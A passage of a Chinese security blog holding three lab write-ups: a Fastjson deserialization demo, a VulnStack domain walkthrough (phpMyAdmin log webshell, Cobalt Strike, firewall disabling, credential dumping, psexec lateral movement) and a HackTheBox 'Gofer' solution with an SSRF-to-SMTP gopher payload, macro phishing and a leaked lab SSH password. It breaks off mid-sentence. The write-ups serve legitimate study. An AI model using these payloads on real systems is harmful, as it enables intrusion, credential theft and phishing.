方法。<br><strong>下面直接引用结论，Fastjson会对满足下列要求的setter&#x2F;getter方法进行调用：</strong><br>满足条件的setter：</p><ul><li>非静态函数</li><li>返回类型为void或当前类</li><li>参数个数为1个</li></ul><p>满足条件的getter：</p><ul><li>非静态方法</li><li>无参数</li><li><strong>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</strong></li></ul><p>前面的properties私有属性，其类型为Properties，而Properties是继承于Hashtable，Hashtable是实现Map接口类的类，因此properties私有属性的<code>getter</code>方法是继承自Map，从而能够成功被Fastjson调用。</p><h3 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1. 漏洞原理"></a>1. 漏洞原理</h3><p>由前面知道，Fastjson是自己实现的一套序列化和反序列化机制，不是用的Java原生的序列化和反序列化机制。无论是哪个版本，Fastjson反序列化漏洞的原理都是一样的，只不过不同版本是针对不同的黑名单或者利用不同利用链来进行绕过利用而已。</p><p>通过Fastjson反序列化漏洞，攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行。</p><h4 id="那么如何才能够反序列化出恶意类呢？"><a href="#那么如何才能够反序列化出恶意类呢？" class="headerlink" title="那么如何才能够反序列化出恶意类呢？"></a>那么如何才能够反序列化出恶意类呢？</h4><p>由前面demo知道，Fastjson使用<code>parseObject()</code>&#x2F;<code>parse()</code>进行反序列化的时候可以指定类型。如果指定的类型太大，包含太多子类，就有利用空间了。例如，如果指定类型为Object或JSONObject，则可以反序列化出来任意类。例如代码写<code>Object o = JSON.parseObject(poc,Object.class)</code>就可以反序列化出Object类或其任意子类，而Object又是任意类的父类，所以就可以反序列化出所有类。</p><h4 id="接着，如何才能触发反序列化得到的恶意类中的恶意函数呢？"><a href="#接着，如何才能触发反序列化得到的恶意类中的恶意函数呢？" class="headerlink" title="接着，如何才能触发反序列化得到的恶意类中的恶意函数呢？"></a>接着，如何才能触发反序列化得到的恶意类中的恶意函数呢？</h4><p>由前面知道，在某些情况下进行反序列化时会将反序列化得到的类的构造函数、<code>getter</code>方法、<code>setter</code>方法执行一遍，如果这三种方法中存在危险操作，则可能导致反序列化漏洞的存在。换句话说，就是攻击者传入要进行反序列化的类中的构造函数、<code>getter</code>方法、<code>setter</code>方法中要存在漏洞才能触发。</p><p>我们到<code>DefaultJSONParser.parseObject(Map object, Object fieldName)</code>中看下，JSON中以@type形式传入的类的时候，调用<code>deserializer.deserialize()</code>处理该类，并去调用这个类的<code>setter</code>和<code>getter</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">parseObject</span><span class="params">(<span class="keyword">final</span> Map object, Object fieldName)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// JSON.DEFAULT_TYPE_KEY即@type</span></span><br><span class="line">    <span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> config.getDeserializer(clazz);</span><br><span class="line">        <span class="keyword">return</span> deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure><p>整个解析过程相当复杂，知道结论就ok了。</p><h4 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h4><p>若反序列化指定类型的类如<code>Student obj = JSON.parseObject(text, Student.class);</code>，该类本身的构造函数、<code>setter</code>方法、<code>getter</code>方法存在危险操作，则存在Fastjson反序列化漏洞；</p><p>若反序列化未指定类型的类如<code>Object obj = JSON.parseObject(text, Object.class);</code>，该若该类的子类的构造方法、<code>setter</code>方法、<code>getter</code>方法存在危险操作，则存在Fastjson反序列化漏洞；</p><h3 id="2-PoC-写法"><a href="#2-PoC-写法" class="headerlink" title="2. PoC 写法"></a>2. PoC 写法</h3><p>一般的，Fastjson反序列化漏洞的PoC写法如下，@type指定了反序列化的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;@type&quot;</span>:<span class="string">&quot;xxx.xxx.xxx&quot;</span>,</span><br><span class="line"><span class="string">&quot;xxx&quot;</span>:<span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键是要找出一个特殊的在目标环境中已存在的类，满足如下两个条件：</p><ol><li>该类的构造函数、<code>setter</code>方法、<code>getter</code>方法中的某一个存在危险操作，比如造成命令执行；</li><li>可以控制该漏洞函数的变量（一般就是该类的属性）；</li></ol><h3 id="3-漏洞Demo"><a href="#3-漏洞Demo" class="headerlink" title="3. 漏洞Demo"></a>3. 漏洞Demo</h3><p>由前面比较的案例知道，当反序列化指定的类型是Object.class，即代码为<code>Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);</code>时，反序列化得到的类的构造函数、所有属性的<code>setter</code>方法、properties私有属性的<code>getter</code>方法都会被调用，因此我们这里直接做最简单的修改，将Student类中会被调用的<code>getter</code>方法添加漏洞代码，这里修改<code>getProperties()</code>作为演示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.util.Properties;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">private</span> String address;  </span><br><span class="line">    <span class="keyword">private</span> Properties properties;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAddress</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAddress&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> address;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">getProperties</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getProperties&quot;</span>);  </span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> properties;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后这里直接新建一个反序列的代码用来触发漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonEasyPoC</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Dome.Student\&quot;,\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;y0n3er\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString, Object.class);  </span><br><span class="line">        System.out.println(obj);  </span><br><span class="line">        System.out.println(obj.getClass().getName());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091126066.png" alt="image-20230809112658404"><br>很明显，前面的Demo中反序列化的类是一个Object类，该类是任意类的父类，其子类Student存在Fastjson反序列化漏洞，当@type指向Student类是反序列化就会触发漏洞。</p><p>对于另一种反序列化指定类的情景，是该指定类本身就存在漏洞，比如我们将上述Demo中反序列化那行代码改成直接反序列化得到Student类而非Object类，这样就是另一个触发也是最直接的触发场景：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Student</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure><h3 id="4-调试分析漏洞"><a href="#4-调试分析漏洞" class="headerlink" title="4. 调试分析漏洞"></a>4. 调试分析漏洞</h3><p>debug一下看看内部运行逻辑<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091127569.png" alt="image-20230809112714870"><br>最终会在断点这个命令执行，当然如果想跟的更深也可以继续进入这个方法跟</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>到这里感觉还不算难，就是利用@type指定类去自动执行构造函数和<code>setter</code>或者<code>getter</code>方法</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80/">Java反序列化Fastjson篇01-FastJson基础 | Drunkbaby’s Blog (drun1baby.top)</a><br><a href="https://johnfrod.top/%e5%ae%89%e5%85%a8/fastjson%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e1-%e5%9f%ba%e6%9c%ac%e5%8e%9f%e7%90%86/">Fastjson反序列化漏洞(1)——基本原理 – JohnFrod’s Blog</a><br><a href="https://www.bilibili.com/video/BV1bD4y117Qh/?spm_id_from=333.999.0.0&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7">https://www.bilibili.com/video/BV1bD4y117Qh/?spm_id_from=333.999.0.0&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>VulnStack--01</title>
      <link href="/undefined/63193.html"/>
      <url>/undefined/63193.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>win7需要通外网，所以需要两张网卡，然后win7需要ping通kali、win2003、win2008<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091138708.png" alt="image-20230809113543512"><br>然后开启win7的PHPstudy就行了，但是这里有个很疑惑的点就是win7可以ping通其它的机器，但是反过来就ping不通很奇怪，访问web服务又是正常的。。。</p><h2 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h2><p>nmap先扫一波<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091138114.png" alt="image-20230809113835029"><br>开放了80和3306端口，先去看看80，是一个php探针，MySQL检测那里直接尝试root&#x2F;root连接成功<br>接着直接访问phpmyadmin利用弱口令登录成功，网上看了看这个版本可以利用日志getshell，查看日志是否开启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;general_log&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091138753.png" alt="image-20230809113854721"><br>未开启，那么直接开启它</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=on;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091139731.png" alt="image-20230809113910701"><br>更改日志文件路径，创建日志文件，这个路径就行从PHP探针那里得到的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file=&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;;</span><br></pre></td></tr></table></figure><p>然后往日志文件写入一句话木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091139044.png" alt="image-20230809113921993"><br>蚁剑连接<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091139718.png" alt="image-20230809113933689"><br>成功连接，外网结束，然后这里通过yxcms也是可以getshell</p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>没怎么接触过内网学习一下。。。</p><h3 id="CS拿shell"><a href="#CS拿shell" class="headerlink" title="CS拿shell"></a>CS拿shell</h3><p>Windows渗透这里直接上线cs，由于已经有了web的shell，所以就可以利用powershell形式的stager直接执行命令就好了，由于第一次使用cs所以在使用方法记录详细点<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091139851.png" alt="image-20230809113943811"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091139908.png" alt="image-20230809113955865"><br>这里不能使用x64payload否则会失败，然后蚁剑执行生成的payload即可成功上线<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091140898.png" alt="image-20230809114015844"><br>这里由于是靶机所以心跳时间（心跳时间是指上线的服务器和cs服务器的通信时间）即回显时间直接设置为0<br>然后执行systeminfo获取一下系统信息，CS的shell执行win的命令只需要在前面加个shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell systeminfo</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091140271.png" alt="image-20230809114029205"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091140937.png" alt="image-20230809114047888"><br>然后会创建一个监听，提权方式随便选个<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091141658.png" alt="image-20230809114107629"><br>然后就会发现上线了一台system权限的主机<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091141714.png" alt="image-20230809114121677"><br>然后看下CS上的炫酷界面<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091141769.png" alt="image-20230809114129723"></p><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><ol><li>首先查看防火墙状态<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell netsh firewall show state</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091141622.png" alt="image-20230809114150570"><br>关闭防火墙</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091142844.png" alt="image-20230809114221821"><br>2. 常规信息收集<br>当前域内计算机列表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091142196.png" alt="image-20230809114234166"><br>三台机器，STU1就是win7，将目标列出<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091142213.png" alt="image-20230809114246141"><br>抓取win7的明文密码，可以直接右键抓取，也可以命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logonpasswords</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091143544.png" alt="image-20230809114315475"><br>然后查看密码凭证<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091143633.png" alt="image-20230809114332560"><br>域控列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net dclist</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091143676.png" alt="image-20230809114351647"></p><h3 id="攻击域控"><a href="#攻击域控" class="headerlink" title="攻击域控"></a>攻击域控</h3><p>横向psexec拿下域控<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091144915.png" alt="image-20230809114404836"><br>用户密码选择上面拿到的<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091144015.png" alt="image-20230809114417979"><br>监听器新建一个smb监听器<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091144067.png" alt="image-20230809114440021"><br>会话选择上面的任意一个<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091145752.png" alt="image-20230809114502711"><br>然后运行，不知道为啥这里攻击失败了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091145966.png" alt="image-20230809114514883"><br>纯纯有毒，后面把靶机卸了重装可以了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091146720.png" alt="image-20230809114538195"><br>然后同样方法拿下域成员，这次的会话选择新上线的域控<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091145015.png" alt="image-20230809114551973"><br>上线成功<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091146993.png" alt="image-20230809114606935"><br>至此拿下域内所有机器，看看拓扑图<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091146474.png" alt="image-20230809114617416"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机也可以利用其它的漏洞拿msf来打，这里我主要为了学下CS所以全程内网用CS操作，感觉打靶机环境很多时候总是奇奇怪怪，一会儿行一会儿不行的，另外看靶机介绍有个痕迹清理，但是看了那么多wp好像没有人写</p>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HacktheBox--Gofer</title>
      <link href="/undefined/27260.html"/>
      <url>/undefined/27260.html</url>
      
        <content type="html"><![CDATA[<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描开放端口<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051910548.png" alt="image-20230805191023390"><br>然后配置etc&#x2F;hosts</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.11.225 gofer.htb&quot; &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>接着访问这个域名没啥发现，然后用dirsearch做了个目录扫描也没发现啥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051910168.png" alt="image-20230805191038098"><br>这个assets看了下没啥东西就存放了些前端的一些静态文件，到这里完全没思路了，猜测问题可能就在下面这个邮箱这里，但是不知道怎么利用<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051910792.png" alt="image-20230805191053738"><br>后面看了完整的视频教程，竟然是通过钓鱼来反弹shell，并且利用smbclient获取到提示之前都不知道这个方法，第一次玩hackthebox的靶机确实想不到<br>其实这里还有个子域名但是dirsearch扫不到，应该是自带里面没有就是<code>proxy.gofer.htb</code>可以通过ffuf来扫，这个工具kali自带了，但是那个字典指定我没找到自带的字典位置这里就不扫描了大概命令如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://gofer.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -H &quot;Host:FUZZ.gofer.htb&quot;</span><br></pre></td></tr></table></figure><p>-w后面就是你要使用的字典，然后把那个子域名加到hosts下再访问<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051911125.png" alt="image-20230805191111085"><br>然后会发现需要登录<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051911663.png" alt="image-20230805191125619"><br>弱口令试了一下无果，直接抓个包看看也没发现啥，然后这里利用smbmap看一下共享文件啥的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H gofer.htb</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051911946.png" alt="image-20230805191136897"><br>emmm，不知道这个终端怎么设置能让它一行展示完不自动换行，可以看到有个只读的共享文件<br>利用smbclient进去看下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N  //gofer.htb/shares</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051912926.png" alt="image-20230805191217866"><br>emmm，没怎么用过这个工具不太熟，里面有个<code>.backup</code>文件夹进去之后发现这个里面有个mail文件下载下来，因为我是用的root去使用的这个工具所以自动下载到了root文件夹，然后打开mail文件看看<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051912727.png" alt="image-20230805191232665"><br>这就相当于一个提示了，可以利用宏钓鱼，但是这个邮箱发送在内部所以就得想办法发邮箱了，这里利用点是上面那个没发现啥东西的包，用POST发包并且加上index.php<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051912072.png" alt="image-20230805191247091"><br>可以看到不再是401了，并且这里提示缺少个url参数，给它加上并且加个本地地址<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051913595.png" alt="image-20230805191319543"><br>存在黑名单，那么这里应该就是有ssrf了，这个黑名单可以用十六进制绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://0x7f000001 </span><br><span class="line"></span><br><span class="line">https://highon.coffee/blog/ssrf-cheat-sheet/  //这个地址提供了一些绕过方法</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051913551.png" alt="image-20230805191332496"><br>然后参考<a href="https://infosecwriteups.com/server-side-request-forgery-to-internal-smtp-access-dea16fe37ed2">网址</a>利用gopher协议在25端口进行邮件发送，payload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gopher://0x7f000001:25/_HELO gofer.htb%0AMAIL FROM: &lt;root@y0n3er.com&gt;%0ARCPT TO: &lt;jhudson@gofer.htb&gt;%0ADATA%0ASubject: &lt;a http://10.10.14.19:7777/bad.odt&gt;SSRF HERE&lt;/a&gt;%0ASSRF AND SMTP%0A.</span><br><span class="line"></span><br><span class="line">url编码：</span><br><span class="line">gopher://0x7f000001:25/_HELO%20gofer.htb%250AMAIL%20FROM:%20%3Croot@y0n3er.com%3E%250ARCPT%20TO:%20%3Cjhudson@gofer.htb%3E%250ADATA%250ASubject:%20%3Ca%20http://10.10.14.19:7777/bad.odt%3ESSRF%20HERE%3C/a%3E%250ASSRF%20AND%20SMTP%250A.</span><br></pre></td></tr></table></figure><p>这个payload就是向Jocelyn Hudson用户发了一个邮件选择这个用户是因为前面的邮件提示她爱点不明邮件，这个里面有一个指向攻击机的超链接，然后利用工具Libreoffice先随便制作一个<code>bad.odt</code>文件，生成一个文本文档即为odt格式，然后用python起个服务再发送邮件<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051913514.png" alt="image-20230805191353429"><br>可以看到靶机后台就点了这个邮件</p><h2 id="反弹shell-宏钓鱼"><a href="#反弹shell-宏钓鱼" class="headerlink" title="反弹shell (宏钓鱼)"></a>反弹shell (宏钓鱼)</h2><p>那么现在就可以加个宏来反弹shell<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051914755.png" alt="image-20230805191407695"><br>然后在你准备的<code>bad.odt</code>加个反弹shell的宏<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051914057.png" alt="image-20230805191418015"><br>保存之后还要加个打开文件运行宏的设置<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051914258.png" alt="image-20230805191427211"><br>然后再起服务发邮件，稍等一下拿到shell<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051914991.png" alt="image-20230805191435903"><br>这里本来想利用python弄个交互式shell发现不行，然后去jhudson目录下打开user.txt拿到user的flag</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先就是用[pspy64](<a href="https://github.com/DominicBreuker/pspy">DominicBreuker&#x2F;pspy: Monitor linux processes without root permissions (github.com)</a>)这个脚本去监听后台不同用户执行的命令，先上传到靶机上<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051914461.png" alt="image-20230805191455314"><br>给它运行权限，然后去运行文件<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051915157.png"><br>发现泄露了用户tbuckley的ssh密码<code>tbuckley:ooP4dietie3o_hquaeti</code>登上去看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tbuckley@gofer.htb</span><br></pre></td></tr></table></figure><p>这里存在两个用户组，找一下属于第二个组的文件<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051915974.png" alt="image-20230805191523914"><br>找到了一个notes文件属于root但是dev具有执行权限，执行一下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051915306.png" alt="image-20230805191534230"><br>基本功能就是写笔记啥的，把这个二进制程序下下来<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051915662.png" alt="image-20230805191545504"><br>然后利用ida或者在线网站给它逆向一下看看代码，case1这里会分配40个字节的内存，然后通过uid判断用户的权限执行不同的操作<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051915693.png" alt="image-20230805191558648"><br>然后是case3这里如果创建了用户执行这个操作就会将var_10_1的内存释放掉，但是这个指针没有清0或者设置为null这就是造成漏洞的地方<br><img 